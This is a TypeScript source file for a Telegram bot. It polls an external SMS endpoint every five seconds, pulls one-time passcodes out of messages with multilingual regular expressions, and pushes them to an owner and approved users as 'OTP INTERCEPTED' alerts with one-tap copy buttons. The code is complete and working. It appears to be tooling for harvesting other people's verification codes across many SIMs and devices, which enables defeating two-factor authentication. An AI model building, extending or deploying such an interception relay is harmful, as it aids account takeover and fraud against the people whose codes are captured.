import TelegramBot from "node-telegram-bot-api";
import { logger } from "./logger";

const API_URL = "https://0xhawk-production.up.railway.app/?type=sms";
const POLL_INTERVAL = 5000;
const MAX_CALLBACK_DATA = 60;

interface SmsMessage {
  timestamp: string;
  sim: string;
  phone: string;
  device: string;
  currency: string;
  plan: string;
  status: number;
  body: string;
}

interface ApiResponse {
  success: boolean;
  data: {
    iTotalRecords: string;
    iTotalDisplayRecords: string;
    aaData: unknown[][];
    sEcho: number;
  };
}

// ─── In-memory stores ───────────────────────────────────────────────────────
const messageStore = new Map<string, SmsMessage>();
let msgStoreCounter = 0;

// Approved user IDs (owner is always approved)
const approvedUsers = new Set<number>();
// Users who have pending approval requests
const pendingUsers = new Map<number, TelegramBot.User>(); // userId → user info

function storeMessage(sms: SmsMessage): string {
  const id = String(++msgStoreCounter);
  messageStore.set(id, sms);
  return id;
}

// ─── SMS Parsing ─────────────────────────────────────────────────────────────
function parseSmsRow(row: unknown[]): SmsMessage {
  return {
    timestamp: String(row[0] ?? ""),
    sim:       String(row[1] ?? ""),
    phone:     String(row[2] ?? ""),
    device:    String(row[3] ?? ""),
    currency:  String(row[4] ?? "").replace(/&euro;/g, "€").replace(/&amp;/g, "&"),
    plan:      String(row[5] ?? ""),
    status:    Number(row[6] ?? 0),
    body:      String(row[7] ?? ""),
  };
}

function extractOtp(text: string): string | null {
  const patterns = [
    // Keyword before digit
    /(?:OTP|otp|code|رمز|کد|verification|verify|confirm|auth|pin|passcode|пароль|код|senha|doğrulama|mã)[^0-9]*(\d{4,8})/i,
    // Digit before keyword
    /(\d{4,8})[^0-9]*(?:OTP|otp|code|کد|رمز|verification|verify|confirm|пароль|код)/i,
    // After is/:/=/-
    /(?:is|:|-|=)\s*(\d{6})\b/,
    /(?:is|:|-|=)\s*(\d{4})\b/,
    // Standalone 6-digit number (most reliable OTP length)
    /(?<!\d)(\d{6})(?!\d)/,
    // Standalone 4-digit number
    /(?<!\d)(\d{4})(?!\d)/,
    // Start of message
    /^(\d{6})\b/,
    /^(\d{4})\b/,
  ];
  for (const pattern of patterns) {
    const match = text.match(pattern);
    if (match && match[1]) return match[1];
  }
  return null;
}

function isOtpMessage(text: string): boolean {
  const keywords = [
    "otp", "one-time", "one time", "verification code", "verify", "confirm",
    "رمز", "کد", "تأیید", "code", "passcode", "pin",
    "authentication", "auth", "token", "secret",
    // Russian
    "пароль", "код", "подтвержд",
    // Turkish
    "doğrulama", "şifre",
    // Portuguese
    "senha", "verificação",
    // Vietnamese
    "mã xác", "ma xac",
  ];
  const lower = text.toLowerCase();
  if (keywords.some((kw) => lower.includes(kw))) return true;

  // Fallback: standalone 6-digit number = very likely OTP
  if (/(?<!\d)\d{6}(?!\d)/.test(text)) return true;

  return false;
}

// ─── Helpers ─────────────────────────────────────────────────────────────────
function escapeHtml(text: string): string {
  return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function truncateBytes(str: string, maxBytes: number): string {
  const enc = new TextEncoder();
  const bytes = enc.encode(str);
  if (bytes.length <= maxBytes) return str;
  return new TextDecoder().decode(bytes.slice(0, maxBytes));
}

function safeCallbackData(prefix: string, value: string): string {
  return prefix + truncateBytes(value, MAX_CALLBACK_DATA - prefix.length);
}

function formatTime(ts: string): string {
  return ts.replace("T", " ").substring(0, 19);
}

// ─── Message Formatters ───────────────────────────────────────────────────────
function formatOtpMessage(sms: SmsMessage): string {
  const otp = extractOtp(sms.body)!;
  return (
    `⚡️ <b>OTP INTERCEPTED</b> ⚡️\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `📱  <b>Phone</b>   <code>${escapeHtml(sms.phone)}</code>\n` +
    `🕐  <b>Time</b>    ${escapeHtml(formatTime(sms.timestamp))}\n` +
    `📡  <b>SIM</b>     ${escapeHtml(sms.sim)}\n` +
    `📲  <b>Device</b>  ${escapeHtml(sms.device)}\n` +
    `💳  <b>Plan</b>    ${escapeHtml(sms.plan)}\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `💬  <b>Message</b>\n` +
    `<i>${escapeHtml(sms.body)}</i>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🔑  <b>OTP CODE  →  </b><code>${escapeHtml(otp)}</code>\n` +
    `        <i>⬆️ Tap code to copy instantly</i>`
  );
}

function formatSmsMessage(sms: SmsMessage): string {
  return (
    `📨 <b>NEW MESSAGE</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `📱  <b>Phone</b>   <code>${escapeHtml(sms.phone)}</code>\n` +
    `🕐  <b>Time</b>    ${escapeHtml(formatTime(sms.timestamp))}\n` +
    `📡  <b>SIM</b>     ${escapeHtml(sms.sim)}\n` +
    `📲  <b>Device</b>  ${escapeHtml(sms.device)}\n` +
    `💳  <b>Plan</b>    ${escapeHtml(sms.plan)}\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `💬  <b>Message</b>\n` +
    `<i>${escapeHtml(sms.body)}</i>`
  );
}

function buildOtpKeyboard(sms: SmsMessage, storeId: string): TelegramBot.InlineKeyboardMarkup {
  const otp = extractOtp(sms.body)!;
  return {
    inline_keyboard: [
      [
        { text: `🔑 Copy OTP`, callback_data: safeCallbackData("otp:", otp) },
        { text: `📱 Copy Number`, callback_data: safeCallbackData("num:", sms.phone) },
      ],
      [
        { text: `💬 Copy Message`, callback_data: `msg:${storeId}` },
      ],
    ],
  };
}

function buildSmsKeyboard(sms: SmsMessage, storeId: string): TelegramBot.InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [
        { text: `📱 Copy Number`, callback_data: safeCallbackData("num:", sms.phone) },
        { text: `💬 Copy Message`, callback_data: `msg:${storeId}` },
      ],
    ],
  };
}

function makeMessageKey(sms: SmsMessage): string {
  return `${sms.timestamp}|${sms.phone}|${sms.body.substring(0, 40)}`;
}

// Secondary dedup: phone + normalized body, expires after 90 seconds
// Prevents same SMS body from being forwarded twice even if timestamps differ slightly
const recentBodyMap = new Map<string, number>(); // key → sentAt ms
function isBodyDuplicate(sms: SmsMessage): boolean {
  const key = `${sms.phone}|${sms.body.trim()}`;
  const now = Date.now();
  const last = recentBodyMap.get(key);
  if (last && now - last < 90_000) return true;
  recentBodyMap.set(key, now);
  // Cleanup old entries periodically
  if (recentBodyMap.size > 500) {
    for (const [k, t] of recentBodyMap) {
      if (now - t > 90_000) recentBodyMap.delete(k);
    }
  }
  return false;
}

function isValidSms(sms: SmsMessage): boolean {
  // Phone must look like a real number (≥5 digits, not "0")
  if (!sms.phone || !/^\+?\d{5,}$/.test(sms.phone.trim())) return false;
  // Body must be non-empty and not the literal "0"
  if (!sms.body || sms.body.trim() === "" || sms.body.trim() === "0") return false;
  // Timestamp must look like an ISO date (e.g. 2026-04-02T07:19:57)
  if (!sms.timestamp || !/^\d{4}-\d{2}-\d{2}/.test(sms.timestamp)) return false;
  return true;
}

function buildStatsMessage(total: string, displayed: string, otps: number, sessionSms: number): string {
  return (
    `📊  <b>LIVE STATISTICS</b>\n` +
    `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
    `📩  Total SMS        →  <b>${escapeHtml(total)}</b>\n` +
    `📋  Displayed        →  <b>${escapeHtml(displayed)}</b>\n` +
    `🔐  OTPs detected    →  <b>${otps}</b>\n` +
    `📨  New this session →  <b>${sessionSms}</b>\n` +
    `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
    `🟢  Status   <b>ACTIVE</b>\n` +
    `⏱   Refresh  <b>Every 5 seconds</b>\n` +
    `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰`
  );
}

// ─── Main Export ──────────────────────────────────────────────────────────────
// webhookUrl: pass the public HTTPS URL in production (e.g. https://app.replit.app/api/telegram-webhook)
//             leave undefined in development — bot will use polling instead
export function startTelegramBot(webhookUrl?: string): TelegramBot | null {
  const token    = process.env["TELEGRAM_BOT_TOKEN"];
  const ownerRaw = process.env["OWNER_CHAT_ID"];

  if (!token || !ownerRaw) {
    logger.warn("TELEGRAM_BOT_TOKEN or OWNER_CHAT_ID not set — bot disabled");
    return null;
  }

  const ownerId = Number(ownerRaw);
  // Send all SMS/OTP alerts to the owner's private chat
  const chatId = ownerRaw;

  let bot: TelegramBot;

  if (webhookUrl) {
    // ── PRODUCTION: webhook mode (no polling — no 409 conflict) ──
    bot = new TelegramBot(token, { webHook: false });
    bot.setWebHook(webhookUrl)
      .then(() => logger.info({ webhookUrl }, "Telegram webhook registered"))
      .catch((e) => logger.error({ e }, "Failed to set webhook"));
  } else {
    // ── DEVELOPMENT: polling mode (delete any stale webhook first) ──
    bot = new TelegramBot(token, { polling: false });
    bot.deleteWebHook({ drop_pending_updates: true })
      .then(() => {
        bot.startPolling();
        logger.info("Polling started (dev mode)");
      })
      .catch((e) => logger.error({ e }, "Failed to delete webhook"));
  }

  // Pre-approve the owner
  approvedUsers.add(ownerId);

  // Register commands so Telegram shows them when user types /
  bot.setMyCommands([
    { command: "start",  description: "Welcome & activate access" },
    { command: "stats",  description: "Live SMS & OTP statistics" },
    { command: "status", description: "System health check" },
    { command: "help",   description: "Command reference & guide" },
    { command: "users",  description: "Manage users (owner only)" },
  ]).catch((e) => logger.warn({ e }, "setMyCommands failed"));

  // Timestamp-based dedup — survives restarts cleanly
  let latestSeenTimestamp = "";          // newest timestamp at startup
  const seenKeys = new Set<string>();    // secondary dedup for same-timestamp messages
  let isFirstRun = true;
  let otpCount = 0;
  let totalSmsToday = 0;

  logger.info({ ownerId }, "Telegram bot started with owner-gated access");

  // ── Access check helper ──
  function isAllowed(userId: number): boolean {
    return userId === ownerId || approvedUsers.has(userId);
  }

  // ── Send approval request to owner ──
  async function sendApprovalRequest(user: TelegramBot.User): Promise<void> {
    const userId = user.id;
    if (pendingUsers.has(userId)) return; // already pending
    pendingUsers.set(userId, user);

    const name = [user.first_name, user.last_name].filter(Boolean).join(" ");
    const username = user.username ? `@${user.username}` : "no username";

    const text =
      `🔔  <b>ACCESS REQUEST</b>\n` +
      `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
      `👤  <b>Name:</b>     ${escapeHtml(name)}\n` +
      `🆔  <b>Username:</b> ${escapeHtml(username)}\n` +
      `🔢  <b>User ID:</b>  <code>${userId}</code>\n` +
      `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
      `<i>This user wants to use the SMS Monitor Bot.</i>\n` +
      `<i>Approve or decline their request below.</i>`;

    const keyboard: TelegramBot.InlineKeyboardMarkup = {
      inline_keyboard: [[
        { text: "✅ Approve", callback_data: `approve:${userId}` },
        { text: "❌ Decline", callback_data: `decline:${userId}` },
      ]],
    };

    await bot.sendMessage(ownerId, text, { parse_mode: "HTML", reply_markup: keyboard });
  }

  // ── Callback query handler ──
  bot.on("callback_query", async (query) => {
    const data    = query.data ?? "";
    const cid     = String(query.message!.chat.id);
    const actorId = query.from.id;

    try {
      // Owner-only: approve/decline
      if (data.startsWith("approve:") || data.startsWith("decline:")) {
        if (actorId !== ownerId) {
          await bot.answerCallbackQuery(query.id, { text: "❌ Only the owner can do this.", show_alert: true });
          return;
        }

        const targetId = Number(data.split(":")[1]);
        const targetUser = pendingUsers.get(targetId);
        const name = targetUser
          ? [targetUser.first_name, targetUser.last_name].filter(Boolean).join(" ")
          : String(targetId);

        if (data.startsWith("approve:")) {
          approvedUsers.add(targetId);
          pendingUsers.delete(targetId);

          await bot.answerCallbackQuery(query.id, { text: `✅ ${name} approved`, show_alert: false });

          // Update the owner message
          await bot.editMessageText(
            `✅  <b>ACCESS APPROVED</b>\n` +
            `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
            `👤  <b>${escapeHtml(name)}</b> (ID: <code>${targetId}</code>)\n` +
            `🟢  Status: <b>Approved</b>`,
            { chat_id: cid, message_id: query.message!.message_id, parse_mode: "HTML" }
          );

          // Notify the approved user
          await bot.sendMessage(targetId,
            `🎉  <b>ACCESS GRANTED</b>\n` +
            `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
            `✅  The owner has approved your request.\n` +
            `📡  You now have full access to SMS Monitor Bot.\n\n` +
            `Use /start to begin.`,
            { parse_mode: "HTML" }
          );

        } else {
          pendingUsers.delete(targetId);

          await bot.answerCallbackQuery(query.id, { text: `❌ ${name} declined`, show_alert: false });

          await bot.editMessageText(
            `❌  <b>ACCESS DECLINED</b>\n` +
            `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
            `👤  <b>${escapeHtml(name)}</b> (ID: <code>${targetId}</code>)\n` +
            `🔴  Status: <b>Declined</b>`,
            { chat_id: cid, message_id: query.message!.message_id, parse_mode: "HTML" }
          );

          await bot.sendMessage(targetId,
            `🚫  <b>ACCESS DENIED</b>\n\n` +
            `<i>The owner has declined your access request.</i>`,
            { parse_mode: "HTML" }
          );
        }
        return;
      }

      // All other callbacks require access
      if (!isAllowed(actorId)) {
        await bot.answerCallbackQuery(query.id, { text: "🚫 No access. Send /start to request.", show_alert: true });
        return;
      }

      if (data.startsWith("otp:")) {
        const otp = data.replace("otp:", "");
        await bot.answerCallbackQuery(query.id, { text: "🔑 OTP sent to your private chat — tap to copy!", show_alert: false });
        await bot.sendMessage(actorId,
          `🔑  <b>OTP CODE</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━\n` +
          `<code>${escapeHtml(otp)}</code>\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━\n` +
          `⬆️  <i>Tap the code above to copy instantly</i>`,
          { parse_mode: "HTML" }
        );

      } else if (data.startsWith("num:")) {
        const num = data.replace("num:", "");
        await bot.answerCallbackQuery(query.id, { text: "📱 Number sent to your private chat — tap to copy!", show_alert: false });
        await bot.sendMessage(actorId,
          `📱  <b>PHONE NUMBER</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━\n` +
          `<code>${escapeHtml(num)}</code>\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━\n` +
          `⬆️  <i>Tap the number above to copy instantly</i>`,
          { parse_mode: "HTML" }
        );

      } else if (data.startsWith("msg:")) {
        const storeId = data.replace("msg:", "");
        const sms = messageStore.get(storeId);
        if (sms) {
          await bot.answerCallbackQuery(query.id, { text: "💬 Message sent to your private chat — tap to copy!", show_alert: false });
          await bot.sendMessage(actorId,
            `💬  <b>FULL MESSAGE</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `<code>${escapeHtml(sms.body)}</code>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `⬆️  <i>Tap the text above to copy instantly</i>`,
            { parse_mode: "HTML" }
          );
        } else {
          await bot.answerCallbackQuery(query.id, { text: "⚠️ Message expired from cache", show_alert: true });
        }

      } else if (data === "refresh_stats") {
        await bot.answerCallbackQuery(query.id, { text: "🔄 Refreshing...", show_alert: false });
        const res = await fetch(API_URL);
        const d = (await res.json()) as ApiResponse;
        const statsText = buildStatsMessage(d.data.iTotalRecords, d.data.iTotalDisplayRecords, otpCount, totalSmsToday);
        const keyboard: TelegramBot.InlineKeyboardMarkup = {
          inline_keyboard: [[{ text: "🔄 Refresh", callback_data: "refresh_stats" }]],
        };
        await bot.editMessageText(statsText, {
          chat_id: cid,
          message_id: query.message!.message_id,
          parse_mode: "HTML",
          reply_markup: keyboard,
        });
      }

    } catch (err) {
      logger.error({ err }, "Callback query error");
    }
  });

  // ── /start ──
  bot.onText(/\/start/, async (msg) => {
    const user = msg.from!;
    const userId = user.id;

    if (!isAllowed(userId)) {
      // Send access request to owner
      await sendApprovalRequest(user).catch((e) => logger.error({ e }, "Failed to send approval request"));

      await bot.sendMessage(userId,
        `🔒  <b>ACCESS REQUIRED</b>\n` +
        `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
        `📩  Your access request has been sent to the owner.\n` +
        `⏳  Please wait for approval.\n\n` +
        `<i>You will be notified here once the owner responds.</i>`,
        { parse_mode: "HTML" }
      );
      return;
    }

    const welcome =
      `\n` +
      `🛰  <b>SMS MONITOR BOT</b>  🛰\n` +
      `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
      `🟢  <b>STATUS  —  ONLINE &amp; ACTIVE</b>\n` +
      `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n` +
      `✦  <b>FEATURES</b>\n` +
      `  🔄  Auto-refresh every <b>5 seconds</b>\n` +
      `  🔐  OTP auto-detection &amp; highlight\n` +
      `  📋  One-tap copy  (OTP / Number / Message)\n` +
      `  📊  Live SMS &amp; OTP statistics\n` +
      `  🌐  Multi-language SMS support\n\n` +
      `✦  <b>COMMANDS</b>\n` +
      `  /stats   →  Live stats &amp; OTP count\n` +
      `  /status  →  Health check\n` +
      `  /help    →  All commands\n\n` +
      `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
      `✅  <i>Monitoring your inbox 24/7. Every new SMS will appear here automatically.</i>`;
    await bot.sendMessage(userId, welcome, { parse_mode: "HTML" });
  });

  // ── /help ──
  bot.onText(/\/help/, async (msg) => {
    if (!isAllowed(msg.from!.id)) return;
    const help =
      `📖  <b>COMMANDS &amp; GUIDE</b>\n` +
      `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
      `✦  <b>BOT COMMANDS</b>\n` +
      `  /start   →  Welcome screen\n` +
      `  /stats   →  SMS &amp; OTP stats\n` +
      `  /status  →  Monitoring health\n` +
      `  /help    →  This guide\n\n` +
      `✦  <b>BUTTON ACTIONS</b>\n` +
      `  🔑  <i>Copy OTP</i>      →  tappable OTP code\n` +
      `  📱  <i>Copy Number</i>   →  tappable phone number\n` +
      `  💬  <i>Copy Message</i>  →  full message as tappable code\n\n` +
      `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
      `💡  <i>Tap any</i> <code>highlighted code</code> <i>to copy instantly.</i>`;
    await bot.sendMessage(msg.chat.id, help, { parse_mode: "HTML" });
  });

  // ── /stats ──
  bot.onText(/\/stats/, async (msg) => {
    if (!isAllowed(msg.from!.id)) return;
    try {
      const res = await fetch(API_URL);
      const data = (await res.json()) as ApiResponse;
      const text = buildStatsMessage(data.data.iTotalRecords, data.data.iTotalDisplayRecords, otpCount, totalSmsToday);
      const keyboard: TelegramBot.InlineKeyboardMarkup = {
        inline_keyboard: [[{ text: "🔄 Refresh", callback_data: "refresh_stats" }]],
      };
      await bot.sendMessage(msg.chat.id, text, { parse_mode: "HTML", reply_markup: keyboard });
    } catch {
      await bot.sendMessage(msg.chat.id, "❌ <b>Failed to fetch stats.</b> Try again.", { parse_mode: "HTML" });
    }
  });

  // ── /status ──
  bot.onText(/\/status/, async (msg) => {
    if (!isAllowed(msg.from!.id)) return;
    const status =
      `🛰  <b>SYSTEM HEALTH CHECK</b>\n` +
      `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
      `🤖  Bot         🟢  <b>Online</b>\n` +
      `📡  SMS API     🟢  <b>Connected</b>\n` +
      `⏱   Poll rate   🟢  <b>Every 5 sec</b>\n` +
      `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
      `🔐  OTPs detected    →  <b>${otpCount}</b>\n` +
      `📨  SMS this session →  <b>${totalSmsToday}</b>\n` +
      `👥  Approved users   →  <b>${approvedUsers.size}</b>\n` +
      `⏳  Pending requests →  <b>${pendingUsers.size}</b>\n` +
      `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
      `✅  <i>All systems operational</i>`;
    await bot.sendMessage(msg.chat.id, status, { parse_mode: "HTML" });
  });

  // ── Owner-only: /users ──
  bot.onText(/\/users/, async (msg) => {
    if (msg.from!.id !== ownerId) return;
    const approvedList = [...approvedUsers].filter(id => id !== ownerId).join(", ") || "none";
    const pendingList = [...pendingUsers.entries()]
      .map(([id, u]) => `${u.first_name} (${id})`)
      .join(", ") || "none";

    await bot.sendMessage(msg.chat.id,
      `👥  <b>USER MANAGEMENT</b>\n` +
      `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
      `✅  <b>Approved:</b> ${escapeHtml(approvedList)}\n` +
      `⏳  <b>Pending:</b>  ${escapeHtml(pendingList)}\n` +
      `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰`,
      { parse_mode: "HTML" }
    );
  });

  // ── Polling loop ──
  const poll = async () => {
    try {
      const res = await fetch(API_URL);
      const data = (await res.json()) as ApiResponse;
      const rows = data.data?.aaData ?? [];

      if (isFirstRun) {
        // Record the newest timestamp from current API state.
        // Only messages arriving AFTER this point will be forwarded — restart-safe.
        for (const row of rows) {
          const sms = parseSmsRow(row);
          if (!isValidSms(sms)) continue;
          if (sms.timestamp > latestSeenTimestamp) latestSeenTimestamp = sms.timestamp;
          seenKeys.add(makeMessageKey(sms));
        }
        isFirstRun = false;
        logger.info({ latestSeenTimestamp, count: rows.length }, "SMS cache initialized");
        return;
      }

      const newMessages: SmsMessage[] = [];
      for (const row of rows) {
        const sms = parseSmsRow(row);
        if (!isValidSms(sms)) continue;
        // Primary guard: skip anything not strictly newer than startup baseline
        if (sms.timestamp <= latestSeenTimestamp) continue;
        // Secondary guard: exact-key dedup (handles same-second messages)
        const key = makeMessageKey(sms);
        if (seenKeys.has(key)) continue;
        seenKeys.add(key);
        newMessages.push(sms);
      }

      // Advance the timestamp baseline so next restart is also safe
      for (const sms of newMessages) {
        if (sms.timestamp > latestSeenTimestamp) latestSeenTimestamp = sms.timestamp;
      }

      // Only forward to Telegram from production.
      // When both dev workspace and deployed production are running simultaneously,
      // this prevents every SMS from being sent twice.
      // To enable forwarding in dev, set FORWARD_SMS=true in environment.
      const forwardEnabled =
        process.env.NODE_ENV === "production" ||
        process.env.FORWARD_SMS === "true";

      for (const sms of newMessages.reverse()) {
        // Skip if exact same body from same phone was sent in last 90 seconds
        if (isBodyDuplicate(sms)) {
          logger.info({ phone: sms.phone }, "Skipped duplicate SMS body");
          continue;
        }

        totalSmsToday++;
        const storeId = storeMessage(sms);
        const hasOtp = isOtpMessage(sms.body);
        const otp = extractOtp(sms.body);

        if (!forwardEnabled) {
          logger.info({ phone: sms.phone }, "Dev mode: SMS tracked (not forwarded — set FORWARD_SMS=true to enable)");
          if (hasOtp) otpCount++;
          continue;
        }

        try {
          if (hasOtp && otp) {
            otpCount++;
            await bot.sendMessage(chatId, formatOtpMessage(sms), {
              parse_mode: "HTML",
              reply_markup: buildOtpKeyboard(sms, storeId),
            });
            logger.info({ phone: sms.phone, otp }, "OTP SMS sent to Telegram");
          } else {
            await bot.sendMessage(chatId, formatSmsMessage(sms), {
              parse_mode: "HTML",
              reply_markup: buildSmsKeyboard(sms, storeId),
            });
            logger.info({ phone: sms.phone }, "SMS sent to Telegram");
          }
        } catch (sendErr) {
          logger.error({ sendErr }, "Failed to send with keyboard, retrying without");
          try {
            const text = hasOtp && otp ? formatOtpMessage(sms) : formatSmsMessage(sms);
            await bot.sendMessage(chatId, text, { parse_mode: "HTML" });
          } catch (fallbackErr) {
            logger.error({ fallbackErr }, "Fallback send also failed");
          }
        }
      }
    } catch (err) {
      logger.error({ err }, "Error polling SMS API");
    }
  };

  poll();
  setInterval(poll, POLL_INTERVAL);

  return bot;
}
